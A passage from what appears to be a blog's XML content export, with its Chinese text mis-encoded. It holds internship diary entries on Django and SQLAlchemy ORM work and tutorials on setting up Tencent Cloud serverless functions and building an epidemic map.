ï¼Œä½¿ç”¨ä¸€ä¸ªçˆ¶ç±»æå–èŠ‚ç‚¹åŸºæœ¬å±æ€§åŒæ—¶ä¸¤ä¸ªå­ç±»title_nodeå’Œexample_nodeç»§æ‰¿çˆ¶ç±»Node</p><p>åŸºæœ¬å®Œæˆå¯¹Xmindè§£æçš„å¼€å‘</p></blockquote></li><li><p>é˜…è¯»DjangoæœåŠ¡å™¨çš„ä»£ç ï¼Œä¸ºå¼€å‘åå°åŠŸèƒ½åšå‡†å¤‡ã€‚</p><ul><li><p>upload_file</p><blockquote><p>æµç¨‹ï¼š</p><p>â€‹è¯»å–åˆ°ä¸Šä¼ çš„æ–‡ä»¶</p><p>â€‹ç”Ÿæˆuuidå¹¶æŠŠâ€œ-â€å»é™¤</p><p>â€‹ç¼“å­˜åˆ°æœ¬åœ°</p><p>â€‹ä¸Šä¼ åˆ°æœåŠ¡å™¨</p><p>â€‹ å°†ä¿¡æ¯è¿”å›å‰ç«¯</p></blockquote></li><li><p>parse_task_status</p><blockquote><p> è·å– è·å–æäº¤çš„è§£æä»»åŠ¡ å’Œ è·å–æäº¤çš„ç”¨ä¾‹å¤„ç†ä»»åŠ¡çš„çŠ¶æ€ è¿”å›å‰ç«¯</p></blockquote></li></ul></li><li><p>æå‰è¯·å‡ä»é…’åº—æ¬åˆ°ç§Ÿæˆ¿é‚£é‡Œäº†ï¼Œä»Šå¤©åˆšå¥½çŠ¶æ€ä¸è¡Œï¼Œæ—©ç‚¹å›å»äº†ã€‚ç§Ÿæˆ¿è¿˜å¯ä»¥ï¼Œåä¸ªåœ°é“å°±åˆ°å…¬å¸äº†ï¼Œç»ˆäºä¸éœ€è¦é‚£ä¹ˆæ—©èµ·äº† å“ˆå“ˆå“ˆã€‚ç§Ÿæˆ¿æ¡ä»¶ä¸­è§„ä¸­çŸ©å§ã€‚</p></li></ul><h2><span id="2020x2f6x2f3">2020&#x2F;6&#x2F;3</span></h2><ul><li><p>ç»§ç»­é˜…è¯»Djangoåå°æºç </p><ul><li><p>parse_usecase_list</p><blockquote><p>è§£æç”¨ä¾‹åˆ—è¡¨åŒ…å«ï¼š</p><p>â€‹è·å–åŒ…å«ç”¨ä¾‹çš„ä¸ªæ•°ï¼Ÿ</p><p>â€‹è·å–ä¼ å…¥å‚æ•°æ‰€å¯¹åº”çš„ç”¨ä¾‹ä¿¡æ¯</p><p>è¿”å›</p></blockquote></li><li><p>update_usecase_content</p><blockquote><p> æ›´æ–° ç”¨ä¾‹å†…å®¹</p><p> åˆ¤æ–­ç”¨ä¾‹æ˜¯å¦ä¸ºè‡ªåŠ¨åŒ–æ ·ä¾‹ æ˜¯çš„è¯å°±éœ€è¦å»åšä¸€äº›åˆæ³•æ€§åˆ¤æ–­</p></blockquote></li><li><p>data_import</p><blockquote><p>åˆ¤æ–­æ˜¯å¦æ›¾ç»å†™è¿‡æ•°æ® å†™è¿‡å°±è¿”å›ï¼Œæ²¡å†™è¿‡å°±åˆ›å»ºå¯¹è±¡ç„¶åå¼‚æ­¥å†™DB</p></blockquote></li><li><p>data_import_status</p><blockquote><p>è¿”å›ä¸Šä¼ æ–‡ä»¶åçš„ç»“æœ</p></blockquote></li><li><p>import_task_history</p><blockquote><p>è·å–å½“å‰ç™»å½•äººæäº¤çš„å¯¼å…¥ä»»åŠ¡åˆ—è¡¨</p></blockquote></li><li><p>auto_fileupload</p><blockquote><p>é€»è¾‘å’Œauto_fileuploadå·®ä¸å¤š å¤„ç†ä¸€äº›å­—æ®µä¸å¤§ä¸€æ ·</p></blockquote></li><li><p>auto_extra_params</p><blockquote><p>è·å–å…³è”çš„æ™ºç ”é¡¹ç›®ä¿¡æ¯ å¹¶ä¸” æ›´æ–°ä»»åŠ¡çŠ¶æ€å’Œä¿¡æ¯</p></blockquote></li><li><p>auto_task_history</p><blockquote><p>è·å–gitè‡ªåŠ¨æ“ä½œçš„ä»»åŠ¡è®°å½•åˆ—è¡¨</p></blockquote></li><li><p>auto_task_history_details</p><blockquote><p>è·å–gitè‡ªåŠ¨æ“ä½œ,æŒ‡å®šä»»åŠ¡çš„ç”¨ä¾‹è®°å½•è¯¦æƒ…åˆ—è¡¨</p></blockquote></li></ul></li><li><p>å¼€ä¼šï¼Œå•†é‡å¤©å¹•åå°æ•°æ®è§£æå’Œå¯è§†åŒ–åŠŸèƒ½ã€‚</p></li></ul><h2><span id="2020x2f6x2f4">2020&#x2F;6&#x2F;4</span></h2><ul><li><p>äº†è§£äº†ä¸€ä¸‹pythonè¿æ¥æ•°æ®åº“çš„å„ç§åŒ…ä»¥åŠç›¸å…³çš„ORMåŒ…ã€‚</p></li><li><p>å¼€ä¼šäº†è§£äº†ä¸€ä¸‹é€»è¾‘å’Œéœ€æ±‚ã€‚</p></li><li><p>æŸ¥çœ‹æ•°æ®åº“å¹¶ä¸”åˆ†æå“ªäº›æ•°æ®æ®µç¼ºå¤±ï¼Œå“ªäº›æ•°æ®æ®µéœ€è¦ã€‚</p></li></ul><h2><span id="2020x2f6x2f5">2020&#x2F;6&#x2F;5</span></h2><ul><li><p>ç»§ç»­åˆ†æéœ€æ±‚å’Œç ”ç©¶æ•°æ®åº“</p></li><li><p>æŸ¥æ‰¾ç¼ºå¤±çš„å­—æ®µã€‚</p></li><li><p>è§£å†³äº†sqlachemyè¿æ¥æ•°æ®åº“çš„é—®é¢˜ï¼ˆenumå­—æ®µï¼‰</p></li></ul><h2><span id="2020x2f6x2f8">2020&#x2F;6&#x2F;8</span></h2><ul><li><p>å’Œwaineæœ€åç¡®å®šéœ€æ±‚ï¼š</p></li><li><p>é€šè¿‡Excelç¡®å®šäº†æ— æ³•è·å–çš„æ•°æ®ï¼Œå¹¶ä¸”åé¦ˆç»™åŒäº‹ã€‚</p></li><li><p>ç»§ç»­ç ”ç©¶sqlAchemyï¼Œå®ç°äº†ï¼š</p><blockquote><p>å¯¹BIGINTçš„æ”¯æŒ</p><p>å¯¹è¡¨å­˜åœ¨ä¸å¦åˆ¤æ–­</p><p>åˆ›å»ºéƒ¨åˆ†æ•°æ®åº“</p><p>å®Œæˆå¯¹å›­åŒºï¼Œäº¤æ¢æœºï¼ŒæœåŠ¡å™¨è¡¨çš„å»ºç«‹ã€‚</p><p>å®Œæˆäº†yamlé…ç½®æ–‡ä»¶çš„ä¹¦å†™</p></blockquote></li></ul><h2><span id="2020x2f6x2f9">2020&#x2F;6&#x2F;9</span></h2><ul><li><p>è§£å†³äº†pythonä¸€ä¸ªå¥‡æ€ªçš„bugï¼ˆåˆ›å»ºå¯¹è±¡çš„æ—¶å€™è¿˜æ˜¯å¾—åŠ ï¼ˆï¼‰ï¼‰</p></li><li><p>å¼€å‘éœ€æ±‚</p><blockquote><p>å®Œæˆäº†å°†å·²çŸ¥æ•°æ®å½•å…¥IDCçŠ¶æ€è¡¨çš„åŠŸèƒ½</p><p>å®Œæˆäº†å°†å·²çŸ¥æ•°æ®å½•å…¥ServerçŠ¶æ€è¡¨çš„åŠŸèƒ½</p><p>å®Œæˆäº†å°†å·²çŸ¥æ•°æ®å½•å…¥switchçŠ¶æ€è¡¨çš„åŠŸèƒ½</p></blockquote></li><li><p>æ ‘ç«‹æµç¨‹ï¼š</p><blockquote><ol><li><p>å¯¹æ•°æ®è¡¨è¿›è¡Œåˆ†æï¼Œå¹¶æŠ½å–æœ‰ç”¨çš„æ•°æ®é¡¹</p></li><li><p>å¯¹æœ‰ç”¨çš„æ•°æ®è¡¨å»ºç«‹domain objectå®ç°å¯¹è±¡å’Œæ•°æ®åº“ä¹‹é—´çš„æ˜ å°„</p></li><li><p>ä¹¦å†™ä¸šåŠ¡é€»è¾‘ï¼Œå°†è¡¨æ•°æ®æœ‰æœºç»“åˆåœ¨ä¸€èµ·</p></li><li><p>ä¹¦å†™æµ‹è¯•æ ·ä¾‹ï¼Œæµ‹è¯•ä¸šåŠ¡é€»è¾‘çš„æ­£ç¡®æ€§ã€‚</p></li><li><p>å¯¹ä»£ç è¿›è¡Œå•æœºæµ‹è¯•</p></li><li><p>æ ¸å¯¹éœ€æ±‚ï¼Œçœ‹çœ‹æ˜¯å¦èƒ½æ»¡è¶³æ ‡å‡†</p></li><li><p>å¯¹ä»£ç Reviewï¼Œä¼˜åŒ–ä»£ç ï¼ˆORMéƒ¨åˆ†ä¼˜åŒ–ï¼Ÿï¼‰</p></li><li><p>å°†ä»£ç éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šï¼Œè¿›è¡Œæµ‹è¯•</p></li><li><p>é¡¹ç›®è¿­ä»£</p></li></ol></blockquote></li></ul><h2><span id="2020x2f6x2f10">2020&#x2F;6&#x2F;10</span></h2><ul><li><p>æŠ½å–ä»£ç  è§£è€¦</p><blockquote><p>ä½¿ç”¨default.yamlä½œä¸ºé…ç½®æ–‡ä»¶</p><p>ä»£ç åˆ†å±‚ï¼š</p><p>â€‹DOå±‚ ï¼š å­˜æ”¾ORMå¯¹è±¡</p><p>â€‹DAOå±‚ï¼š ç”¨äºå¯¹æ•°æ®åº“ä»¥åŠé…ç½®æ–‡ä»¶å¤„ç†</p><p>â€‹Serviceå±‚ï¼šå®ç°ä¸šåŠ¡é€»è¾‘</p></blockquote></li><li><p>æ ¹æ®éœ€æ±‚é‡å†™é€»è¾‘</p><blockquote><p>ç”±äºä»£ç ç»“æ„çš„åˆç†æ€§ï¼Œä¿®æ”¹å˜å¾—ç®€å•ã€‚</p></blockquote></li><li><p>é˜…è¯»æ–°æ•°æ®åº“ï¼Œåˆ†ææŠ½å–æœ‰ç”¨çš„éƒ¨åˆ†ï¼Œå¹¶ä¸”åˆ›å»ºå¯¹åº”çš„ORM DO</p><blockquote><p>å¦‚ä½•é’ˆå¯¹æ¯å¤©æ¥æ’å…¥æ•°æ®ï¼Ÿæ—¥æœŸçš„å¯¹æ¯”ï¼Ÿ</p><p>ç ”ç©¶pythonä¸­çš„æ—¥æœŸ</p><p>è¡¨åæ ¹æ®æ—¥æœŸå˜æ¢å¸¦æ¥çš„æ•°æ®åº“è¡¨è®¿é—®é—®é¢˜ï¼Ÿ</p></blockquote></li><li><p>å»ºç«‹ORMå¯¹è±¡å°æŠ€å·§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">` [a-zA-Z]*.*</span><br></pre></td></tr></table></figure></li></ul><h2><span id="2020x2f6x2f11">2020&#x2F;6&#x2F;11</span></h2><ul><li><p>åŠ¨æ€æ”¹å˜è¡¨å</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">OptServerInfoGetter</span>(<span class="params">suffix, Base_class=Base</span>):</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">OptServerRelationInfo</span>(<span class="title class_ inherited__">Base_class</span>):</span><br><span class="line">     __tablename__ = <span class="string">&#x27;opt_info_&#x27;</span> + suffix</span><br><span class="line">     manageip = Column(String(<span class="number">16</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">     interface = Column(String(<span class="number">64</span>))</span><br><span class="line">     description = Column(String(<span class="number">128</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">     status = Column(String)</span><br><span class="line">     bandwidth = Column()</span><br><span class="line">     unitType = Column()</span><br><span class="line">     rateCount = Column()</span><br><span class="line">     ratePkgCount = Column()</span><br><span class="line">     outputunitType = Column()</span><br><span class="line">     outputrateCount = Column()</span><br><span class="line">     outputratePkgCount = Column()</span><br><span class="line">     orderlist = Column()</span><br><span class="line"> <span class="keyword">return</span> OptServerRelationInfo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OptServerRelationInfo = OptServerInfoGetter(<span class="string">&#x27;20200609&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>ç»§ç»­ä¼˜åŒ–ä»£ç </p><blockquote><p>â€‹DOï¼š å­˜æ”¾ORMå¯¹è±¡</p><p>â€‹DAOï¼š ç”¨äºå¯¹æ•°æ®åº“ä»¥åŠé…ç½®æ–‡ä»¶å¤„ç†</p><p>â€‹Serviceï¼šå®ç°ä¸šåŠ¡é€»è¾‘</p><p>â€‹Utilsï¼šå®ç°å…¶ä½™å·¥å…·åŠŸèƒ½</p></blockquote></li><li><p>éœ€è¦è®²ä¸€ä¸‹å«æ˜Ÿçš„é¡¹ç›®ï¼š</p></li><li><p>è®¨è®ºäº†ä¸€ä¸‹æ•°æ®çš„æ¥æºé—®é¢˜</p><blockquote><p>è¿›åˆ¶æ¢ç®—1k ç„¶åå³°å€¼è®¡ç®—éœ€è¦sumæ¥åš</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®ä¹ æ—¥è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tencent-SCF</title>
      <link href="/2020/05/07/SCF/"/>
      <url>/2020/05/07/SCF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>è®°å½•ä¸€ä¸‹ä½¿ç”¨serverless SCFä¸­å®è·µçš„è¿‡ç¨‹é‡åˆ°çš„ä¸€äº›å‘ã€‚</p><span id="more"></span><!-- toc --><ul><li><a href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83">é…ç½®ç¯å¢ƒ</a><ul><li><a href="#%E8%AE%BE%E7%BD%AEapi%E5%AF%86%E9%92%A5">è®¾ç½®APIå¯†é’¥</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E8%A7%92%E8%89%B2">è®¾ç½®è§’è‰²</a></li></ul></li><li><a href="#%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83">ç”Ÿäº§ç¯å¢ƒ</a><ul><li><a href="#%E6%8E%A7%E5%88%B6%E5%8F%B0">æ§åˆ¶å°</a></li><li><a href="#cli">CLI</a></li><li><a href="#vscode%E6%8E%A8%E8%8D%90">VSCodeï¼ˆæ¨èï¼‰</a></li></ul></li><li><a href="#scf%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8">SCFè¿›é˜¶ä½¿ç”¨</a><ul><li><a href="#%E6%B5%8B%E8%AF%95">æµ‹è¯•</a></li><li><a href="#%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2">æ—¥å¿—æŸ¥è¯¢</a></li><li><a href="#scf%E7%9B%91%E6%8E%A7%E4%B8%8E%E5%91%8A%E8%AD%A6">SCFç›‘æ§ä¸å‘Šè­¦</a></li></ul></li><li><a href="#scf%E8%A7%A6%E5%8F%91%E5%99%A8%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE">SCFè§¦å‘å™¨ç±»å‹ä»¥åŠå¦‚ä½•é…ç½®</a><ul><li><a href="#%E8%A7%A6%E5%8F%91%E5%99%A8%E7%B1%BB%E5%9E%8B">è§¦å‘å™¨ç±»å‹</a></li><li><a href="#scf%E7%BD%91%E7%BB%9C%E4%B8%8E%E9%85%8D%E7%BD%AE">SCFç½‘ç»œä¸é…ç½®</a><ul><li><a href="#%E9%85%8D%E7%BD%AEvpc">é…ç½®VPC</a></li></ul></li><li><a href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">é…ç½®ç¯å¢ƒå˜é‡</a></li><li><a href="#api-explorer">API Explorer</a></li></ul></li></ul><!-- tocstop --><h1><span id="é…ç½®ç¯å¢ƒ">é…ç½®ç¯å¢ƒ</span></h1><h2><span id="è®¾ç½®apiå¯†é’¥">è®¾ç½®APIå¯†é’¥</span></h2><p><img src="/2020/05/07/SCF/image-20200507125902880.png" alt="è®¾ç½®APIå¯†é’¥"></p><p>ç™»å½•è…¾è®¯äº‘ï¼Œåœ¨äº‘äº§å“ä¸­å»è®¾ç½®ä¸€ä¸ªæ–°çš„ç§˜é’¥ã€‚</p><h2><span id="è®¾ç½®è§’è‰²">è®¾ç½®è§’è‰²</span></h2><p><img src="/2020/05/07/SCF/image-20200507130010962.png" alt="è®¾ç½®è§’è‰²"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬éœ€è¦ä¸ºscfå»è®¾ç½®è§’è‰²ï¼Œé˜²æ­¢ä¸Šä¼ çš„æ—¶å€™å‡ºç°é—®é¢˜ã€‚</p><p><img src="/2020/05/07/SCF/image-20200507130137864.png"></p><p>é€‰æ‹©ä¸€ä¸ªç­–ç•¥åï¼Œç„¶åé‡å‘½åä¸ºSCF_QcsRoleï¼Œè¿™ä¸ªæ˜¯ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·çš„æ—¶å€™è¿è¡Œscf deployçš„æ—¶å€™é»˜è®¤ä¸Šä¼ ä½¿ç”¨çš„åå­—ã€‚</p><h1><span id="ç”Ÿäº§ç¯å¢ƒ">ç”Ÿäº§ç¯å¢ƒ</span></h1><h2><span id="æ§åˆ¶å°">æ§åˆ¶å°</span></h2><p>ç›´æ¥æ‰“å¼€æˆ‘ä»¬webç«¯çš„æ§åˆ¶å°å»coding</p><h2><span id="cli">CLI</span></h2><ul><li>é…ç½®pythonç¯å¢ƒå’Œpipã€‚</li></ul><p><a href="https://cloud.tencent.com/document/product/583/33449">https://cloud.tencent.com/document/product/583/33449</a> æ ¹æ®é“¾æ¥é…ç½®</p><ul><li>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¹¶æŒ‰ç…§æç¤ºè¾“å…¥å¯¹åº”ä¿¡æ¯ï¼š</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ scf configure <span class="built_in">set</span></span><br><span class="line">[-] appid = <span class="number">1255721742</span></span><br><span class="line">[-] region = ap-guangzhou</span><br><span class="line">[-] secret-id = ********************************cEr7</span><br><span class="line">[-] secret-key = ****************************mkYA</span><br><span class="line">[-] using-cos = True (By default, it is deployed by COS.)</span><br><span class="line">Allow report information to <span class="built_in">help</span> us optimize scfcli(Y/n):</span><br></pre></td></tr></table></figure><h2><span id="vscodeæ¨è">VSCodeï¼ˆæ¨èï¼‰</span></h2><p>ä¸‹è½½tencent scfæ’ä»¶å³å¯ã€‚</p><h1><span id="scfè¿›é˜¶ä½¿ç”¨">SCFè¿›é˜¶ä½¿ç”¨</span></h1><h2><span id="æµ‹è¯•">æµ‹è¯•</span></h2><ul><li>VSCode</li></ul><blockquote><p>ä½¿ç”¨æœ¬åœ°è°ƒè¯•ï¼Œç„¶åé€‰æ‹©æ–¹æ³•å³å¯</p></blockquote><p><img src="/2020/05/07/SCF/image-20200507132307806.png"></p><ul><li>æ§åˆ¶å°</li></ul><blockquote><p>é€šè¿‡ å‡½æ•°æœåŠ¡-&gt; å‡½æ•°ä»£ç é‡Œé¢é€‰æ‹©æµ‹è¯•æ–¹æ³•å³å¯</p></blockquote><p><img src="/2020/05/07/SCF/image-20200507132358519.png"></p><p><img src="/2020/05/07/SCF/image-20200507132425062.png"></p><h2><span id="æ—¥å¿—æŸ¥è¯¢">æ—¥å¿—æŸ¥è¯¢</span></h2><ul><li><p>æ–¹æ³•ä¸€</p><blockquote><p>åœ¨æ§åˆ¶å°ç‚¹å‡» æ—¥å¿—æŸ¥è¯¢</p></blockquote></li><li><p>æ–¹æ³•äºŒ</p><blockquote><p>é…ç½®æ—¥å¿—æµæ°´</p></blockquote></li></ul><p><img src="/2020/05/07/SCF/image-20200507132646019.png" alt="æ—¥å¿—æµæ°´"></p><ol><li><p>åˆ›å»ºæ—¥å¿—é›†ï¼ˆåœ°ç‚¹ä¸€å®šè¦ä¿æŒä¸€è‡´ï¼‰</p><p><img src="/2020/05/07/SCF/image-20200507133349054.png"></p></li><li><p>åˆ›å»ºæ—¥å¿—ä¸»é¢˜</p><p><img src="/2020/05/07/SCF/image-20200507133421836.png"></p></li><li><p>åˆ›å»ºæ—¥å¿—ç´¢å¼•</p><p><img src="/2020/05/07/SCF/image-20200507133451675.png"></p></li><li><p>äº‘å‡½æ•°é…ç½®æ—¥å¿—æŠ•é€’</p><p><img src="/2020/05/07/SCF/image-20200507133545799.png"></p></li><li><p>æŸ¥è¯¢æ—¥å¿—</p><p><img src="/2020/05/07/SCF/image-20200507133738427.png"></p></li></ol><p>åœ¨å‡½æ•°é…ç½®ä¸­å¯ä»¥é…ç½®æ—¥å¿—æŠ•é€’ä¿¡æ¯ï¼Œé€‰æ‹©æ—¥å¿—é›†å°±å¯ä»¥äº†ã€‚</p><h2><span id="scfç›‘æ§ä¸å‘Šè­¦">SCFç›‘æ§ä¸å‘Šè­¦</span></h2><ol><li><p>å„é¡¹ç›‘æ§ä¿¡æ¯</p><blockquote><p>å¯ä»¥åœ¨ ç›‘æ§ä¿¡æ¯ é‡Œé¢çœ‹åˆ°</p></blockquote></li><li><p>é…ç½®å‘Šè­¦</p><p><img src="/2020/05/07/SCF/image-20200507134302273.png"></p><p><img src="/2020/05/07/SCF/image-20200507134340161.png"></p><p><img src="/2020/05/07/SCF/image-20200507134616754.png"></p><p><img src="/2020/05/07/SCF/image-20200507134558753.png"></p><p><img src="/2020/05/07/SCF/image-20200507143042137.png"></p></li></ol><h1><span id="scfè§¦å‘å™¨ç±»å‹ä»¥åŠå¦‚ä½•é…ç½®">SCFè§¦å‘å™¨ç±»å‹ä»¥åŠå¦‚ä½•é…ç½®</span></h1><h2><span id="è§¦å‘å™¨ç±»å‹">è§¦å‘å™¨ç±»å‹</span></h2><ul><li>å®šæ—¶è§¦å‘</li><li>COSè§¦å‘</li><li>CMQä¸»é¢˜è®¢é˜…è§¦å‘</li><li>Ckafkaè§¦å‘</li><li>APIç½‘å…³è§¦å‘</li></ul><h2><span id="scfç½‘ç»œä¸é…ç½®">SCFç½‘ç»œä¸é…ç½®</span></h2><p><img src="/2020/05/07/SCF/image-20200507143736842.png"></p><h3><span id="é…ç½®vpc">é…ç½®VPC</span></h3><p><img src="/2020/05/07/SCF/image-20200507155739972.png"></p><p><img src="/2020/05/07/SCF/image-20200507155713492.png"></p><h2><span id="é…ç½®ç¯å¢ƒå˜é‡">é…ç½®ç¯å¢ƒå˜é‡</span></h2><p><img src="/2020/05/07/SCF/image-20200507155926430.png"></p><h2><span id="api-explorer">API Explorer</span></h2><blockquote><p>æ–‡æ¡£-&gt;APIä¸­å¿ƒ-&gt;äº‘å‡½æ•°-&gt;å‡½æ•°ç›¸å…³æ¥å£-&gt;è¿è¡Œå‡½æ•°-&gt;API Explorer</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCFä¹‹ç–«æƒ…åœ°å›¾</title>
      <link href="/2020/05/07/yiqing/"/>
      <url>/2020/05/07/yiqing/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E5%88%B6%E4%BD%9C%E7%96%AB%E6%83%85%E5%9C%B0%E5%9B%BE">åˆ¶ä½œç–«æƒ…åœ°å›¾</a><ul><li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">å‡†å¤‡å·¥ä½œ</a></li><li><a href="#%E6%95%88%E6%9E%9C%E9%A2%84%E8%A7%88">æ•ˆæœé¢„è§ˆ</a></li><li><a href="#%E7%9F%A5%E8%AF%86%E7%82%B9">çŸ¥è¯†ç‚¹</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E4%B8%80-%E8%A1%A5%E5%85%85%E4%BA%91%E5%87%BD%E6%95%B0%E9%80%BB%E8%BE%91">ä»»åŠ¡ä¸€ è¡¥å……äº‘å‡½æ•°é€»è¾‘</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E4%BA%8C-%E7%BB%99%E6%A8%A1%E6%9D%BF%E8%A1%A5%E5%85%85%E9%80%BB%E8%BE%91">ä»»åŠ¡äºŒ ç»™æ¨¡æ¿è¡¥å……é€»è¾‘</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E4%B8%89-%E5%88%9B%E5%BB%BA-api-%E7%BD%91%E5%85%B3%E8%A7%A6%E5%8F%91%E5%99%A8">ä»»åŠ¡ä¸‰ åˆ›å»º API ç½‘å…³è§¦å‘å™¨</a></li><li><a href="#%E4%BB%BB%E5%8A%A1%E5%9B%9B-%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D">ä»»åŠ¡å›› æ·»åŠ è‡ªå®šä¹‰åŸŸå</a></li></ul></li></ul><!-- tocstop --><h1><span id="åˆ¶ä½œç–«æƒ…åœ°å›¾">åˆ¶ä½œç–«æƒ…åœ°å›¾</span></h1><h2><span id="å‡†å¤‡å·¥ä½œ">å‡†å¤‡å·¥ä½œ</span></h2><ol><li>è¿›å…¥è…¾è®¯äº‘æ§åˆ¶å°ï¼Œåœ¨å·¦ä¸Šè§’äº‘äº§å“èœå•é‡Œï¼Œé€‰æ‹©ã€ç®¡ç†ä¸å®¡è®¡ã€‘-&gt; ã€è®¿é—®ç®¡ç†ã€‘ï¼Œè¿›å…¥ååœ¨å·¦è¾¹èœå•æ ä¸­é€‰æ‹©ã€è®¿é—®å¯†é’¥ã€‘-&gt;ã€API å¯†é’¥ç®¡ç†ã€‘ï¼Œç”Ÿæˆå¹¶è·å–ä¸€å¯¹ API å¯†é’¥ã€‚</li></ol><p><img src="https://camo.githubusercontent.com/89a1dd621bc76992d556458a4556ae5ad2fdd5f2/68747470733a2f2f61736b2e71636c6f7564696d672e636f6d2f64726166742f313031313631382f676570653077626163332e706e67" alt="è·å–è…¾è®¯äº‘APIå¯†é’¥"></p><ol start="2"><li><p>åœ¨ç”µè„‘å®‰è£… <code>Node.js</code> è¯­è¨€è¿è¡Œç¯å¢ƒï¼Œå»ºè®®å¤§äº 8.0 ç‰ˆæœ¬ã€‚</p></li><li><p>å®‰è£… <code>VS Code</code> + <code>Tencent Serverless Toolkit</code> æ’ä»¶ï¼Œæˆ–è€…å®‰è£…å‘½ä»¤è¡Œå·¥å…·ã€‚</p></li></ol><p>å‰è€…å¯å‚è€ƒæ–‡æ¡£ï¼š<a href="https://cloud.tencent.com/document/product/583/38106">https://cloud.tencent.com/document/product/583/38106</a><br>åå°å¯å‚è€ƒæ–‡æ¡£ï¼š<a href="https://cloud.tencent.com/document/product/583/33445">https://cloud.tencent.com/document/product/583/33445</a></p><p>é€šè¿‡äº†è§£æ–‡æ¡£ï¼Œæˆ–è€…æœ¬è¯¾ç¨‹ä¹‹å‰çš„ç« èŠ‚ï¼Œå­¦ä¹ å¦‚ä½•ç”¨<code>VS Code</code>æ’ä»¶æˆ–å‘½ä»¤è¡Œå·¥å…·åˆ›å»ºå’Œä¸Šä¼ äº‘å‡½æ•°ã€‚</p><p>å­¦ä¹ å®Œåï¼Œè¯·åˆ›å»ºä¸€ä¸ªåä¸º <code>yiqing</code> çš„äº‘å‡½æ•°ã€‚</p><ol start="4"><li>åœ¨<a href="https://github.com/lcxfs1991/tencentcloudcourse">https://github.com/lcxfs1991/tencentcloudcourse</a>ä¸‹è½½æœ¬è¯¾ç¨‹çš„ä»£ç åŒ…ï¼Œç›®å½•æ˜¯ <code>scr/yiqing</code>ï¼Œå¹¶å°†é‡Œé¢çš„ä»£ç è¦†ç›–åˆšæ‰æ–°åˆ›å»ºçš„<code>yiqing</code>äº‘å‡½æ•°ä¸­çš„æ–‡ä»¶ã€‚ç„¶ååœ¨è¯¥ç›®å½•ä¸­å‘½ä»¤è¡Œè¿è¡Œ<code>npm i</code>ï¼Œå®‰è£…ä»£ç åŒ…çš„ä¾èµ–ã€‚</li></ol><h2><span id="æ•ˆæœé¢„è§ˆ">æ•ˆæœé¢„è§ˆ</span></h2><p><img src="https://user-images.githubusercontent.com/3348398/73936655-44c79b00-491e-11ea-8bb1-aada7aa08cfa.png" alt="ç–«æƒ…åœ°å›¾"></p><h2><span id="çŸ¥è¯†ç‚¹">çŸ¥è¯†ç‚¹</span></h2><ol><li>çŸ¥é“å¦‚ä½•åˆ©ç”¨å·¥å…·åˆ›å»ºå’Œä¸Šä¼ äº‘å‡½æ•°</li><li>çŸ¥é“å¦‚ä½•åˆ›å»º<code>API</code>ç½‘å…³è§¦å‘å™¨</li><li>çŸ¥é“å¦‚ä½•åœ¨äº‘å‡½æ•°ä¸­éƒ¨ç½²èƒ½æ¸²æŸ“<code>HTML</code>çš„æœåŠ¡</li><li>EChart.js çš„ä½¿ç”¨</li></ol><h2><span id="ä»»åŠ¡ä¸€-è¡¥å……äº‘å‡½æ•°é€»è¾‘">ä»»åŠ¡ä¸€ è¡¥å……äº‘å‡½æ•°é€»è¾‘</span></h2><p>åœ¨äº‘å‡½æ•°<code>yiqing</code>çš„<code>index.js</code>æ–‡ä»¶ä¸­ï¼Œæ 